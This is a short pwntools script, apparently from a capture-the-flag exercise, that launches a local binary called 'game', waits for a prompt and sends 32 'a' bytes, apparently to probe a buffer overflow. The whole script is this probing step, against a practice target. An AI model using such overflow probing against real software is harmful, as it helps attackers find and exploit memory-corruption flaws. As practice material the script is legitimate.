from pwn import *
context(log_level="debug")

p = process("./game")
p.recvuntil("?\n")
p.send("a"*32)